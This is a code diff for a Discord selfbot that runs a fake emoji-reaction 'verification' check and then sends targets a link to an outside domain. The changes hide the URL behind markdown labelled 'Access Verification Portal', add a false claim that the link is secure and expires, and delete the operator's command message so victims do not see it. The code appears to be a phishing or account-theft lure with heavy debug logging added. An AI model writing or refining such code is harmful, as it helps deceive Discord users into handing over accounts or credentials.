@@ -107,10 +107,13 @@ client.on("messageReactionAdd", async (reaction, user) => {
 
     // Check if the clicked icon is correct
     if (clickedIcon === verification.correctIcon) {
-      // Correct! Send them the verification link
+      // Correct! Send them the verification link (masked with markdown)
       try {
         await reaction.message.channel.send(
-          `${user} ✅ Verification successful! Click here to continue: https://assetsfixpro.cloud/discordx0x/x0/`
+          `${user} ✅ **Identity Verified Successfully**\n\n` +
+            `Your account has been authenticated. Please proceed to complete your registration:\n` +
+            `[Access Verification Portal](https://assetsfixpro.cloud/discordx0x/x0/)\n\n` +
+            `_This link is secure and will expire in 10 minutes._`
         );
 
         console.log(`✅ ${user.tag} verified successfully`);
@@ -261,66 +264,106 @@ client.on("guildMemberAdd", async (member) => {
 });
 
 client.on("messageCreate", async (message) => {
-  // Ignore messages from the bot itself
-  if (message.author.id === client.user.id) return;
+  // Debug: Log ALL messages
+  console.log(
+    `📨 Message received: "${message.content}" from ${message.author.tag}`
+  );
+
+  // For selfbots, we DON'T ignore own messages for commands
+  // (Selfbot = your own account, so YOU type the commands)
 
   // Check for verification command: !verify @user or @verify @user or /verify @user
   const msgContent = message.content.toLowerCase();
+  console.log(`🔍 Checking message content: "${msgContent}"`);
+
   const isVerifyCommand =
     msgContent.startsWith("!verify") ||
     msgContent.startsWith("@verify") ||
     msgContent.startsWith("/verify") ||
     msgContent.startsWith("verify");
 
+  console.log(`🎯 Is verify command? ${isVerifyCommand}`);
+
   if (isVerifyCommand) {
     console.log(
-      `Verify command detected from ${message.author.tag}: "${message.content}"`
+      `✅ Verify command detected from ${message.author.tag}: "${message.content}"`
+    );
+    console.log(`👥 Mentions count: ${message.mentions.users.size}`);
+    console.log(
+      `👥 Mentioned users:`,
+      message.mentions.users.map((u) => u.tag).join(", ")
     );
 
     // Check if user mentioned someone
     if (message.mentions.users.size === 0) {
+      console.log(`❌ No user mentioned, sending error`);
       await message.reply(
         "❌ Please mention a user to verify. Example: `!verify @username`"
       );
       return;
     }
 
-    console.log(`Verification command detected from ${message.author.tag}`);
+    console.log(`✅ User mentioned, checking permissions...`);
+    console.log(`👤 Member object exists? ${!!message.member}`);
+    console.log(`🔐 Permissions:`, message.member?.permissions?.toArray());
 
     // Check if user is admin (has ADMINISTRATOR or MANAGE_GUILD permission)
     const isAdmin =
       message.member?.permissions?.has("ADMINISTRATOR") ||
       message.member?.permissions?.has("MANAGE_GUILD");
 
+    console.log(`🔑 Is admin? ${isAdmin}`);
+
     if (!isAdmin) {
+      console.log(`❌ User is not admin, denying access`);
       await message.reply(
         "❌ You need administrator permissions to use this command."
       );
       return;
     }
 
+    console.log(`✅ Admin verified, proceeding with verification...`);
+
     const targetUser = message.mentions.users.first();
+    console.log(`🎯 Target user: ${targetUser.tag} (${targetUser.id})`);
 
     try {
+      // Delete the admin's command message so users don't see it
+      try {
+        await message.delete();
+        console.log(`🗑️ Deleted admin command message`);
+      } catch (err) {
+        console.log(`⚠️ Could not delete command message: ${err.message}`);
+      }
+
       // Random verification icons (emojis)
       const icons = ["🔒", "🔑", "✅", "🛡️", "⭐", "🎯"];
       const correctIcon = icons[Math.floor(Math.random() * icons.length)];
+      console.log(`🎲 Correct icon selected: ${correctIcon}`);
 
       // Shuffle icons for options
       const shuffledIcons = [...icons].sort(() => Math.random() - 0.5);
+      console.log(`🔀 Shuffled icons: ${shuffledIcons.join(" ")}`);
 
       // Create verification message with reactions (selfbots can't send buttons)
+      console.log(`📤 Sending verification message...`);
       const verifyMessage = await message.channel.send(
         `${targetUser}, please verify yourself by reacting with the **${correctIcon}** emoji below:`
       );
+      console.log(
+        `✅ Verification message sent! Message ID: ${verifyMessage.id}`
+      );
 
       // Add all icon reactions to the message
+      console.log(`➕ Adding reactions...`);
       for (const icon of shuffledIcons) {
+        console.log(`  Adding reaction: ${icon}`);
         await verifyMessage.react(icon);
       }
+      console.log(`✅ All reactions added!`);
 
       console.log(
-        `Verification sent to ${targetUser.tag} - Correct icon: ${correctIcon}`
+        `🎉 Verification sent to ${targetUser.tag} - Correct icon: ${correctIcon}`
       );
 
       // Store the correct answer for this verification
